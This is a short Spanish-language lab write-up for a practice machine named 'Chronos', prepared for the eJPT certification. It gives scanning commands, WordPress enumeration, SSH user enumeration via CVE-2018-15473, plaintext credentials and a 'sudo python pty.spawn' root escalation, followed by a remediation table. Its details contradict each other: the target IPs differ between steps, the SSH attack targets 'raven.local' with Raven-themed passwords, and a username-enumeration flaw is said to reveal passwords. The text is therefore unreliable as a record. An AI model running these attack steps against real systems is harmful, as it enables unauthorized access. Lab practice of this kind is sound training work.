# Informe de Pentesting - Chronos

**Máquina:** Chronos
**Autor:** Klauss Reyes Granados
**Certificación:** Preparación eJPT

---

## 🎯 Objetivo

Realizar pruebas de penetración sobre la máquina "Chronos" mediante análisis de servicios web, ataques a SSH y escalado de privilegios en Linux.

---

## 🛰️ Recolección de Información

* IP atacante: 192.1.1.11
* Escaneo de red:

  ```bash
  arp-scan -I eth0 192.1.1.0/24
  ```
* Escaneo de puertos:

  ```bash
  nmap -p- -sV -sS -Pn -n 192.1.1.12
  ```

---

## 🔎 Enumeración de Servicios

### Puerto 80 - HTTP

* Página por defecto Apache en Debian.
* Descubrimiento de directorio WordPress:

```bash
dirb http://192.1.1.10/wordpress
```

* Usuarios WordPress encontrados:

  * michael
  * steven

---

## 💥 Explotación

### Ataque SSH por CVE-2018-15473 (username enumeration)

```bash
./ssh-username-enum.py -t 10 -w wordlist_raven raven.local
```

* Credenciales válidas:

  * michael\:michael
  * root\:R\@v3nSecurity
  * steven\:pink84

Acceso exitoso vía SSH.

---

## ⬆️ Escalado de Privilegios

* Utilización de Python para invocar shell interactiva con privilegios:

```bash
sudo python -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 🚨 Vulnerabilidades Detectadas

| ID | Vulnerabilidad                      | Nivel   | Recomendación                                                         |
| -- | ----------------------------------- | ------- | --------------------------------------------------------------------- |
| 1  | Enumeración de usuarios SSH vía CVE | Alto    | Parchear versión afectada                                             |
| 2  | Contraseñas débiles (usuario=root)  | Crítico | Usar autenticación basada en claves y política de contraseñas seguras |
| 3  | Escalada simple vía Python sudo     | Alto    | Limitar comandos sudo ejecutables                                     |

---

## ✅ Conclusiones

* Se identificaron cuentas activas mediante enumeración remota de usuarios.
* Acceso total fue obtenido explotando contraseñas débiles.
* Privilegios root se alcanzaron mediante uso de Python desde sudo sin restricción.

> Máquina útil para practicar vulnerabilidades conocidas en SSH y técnicas básicas de evasión en entornos Linux.
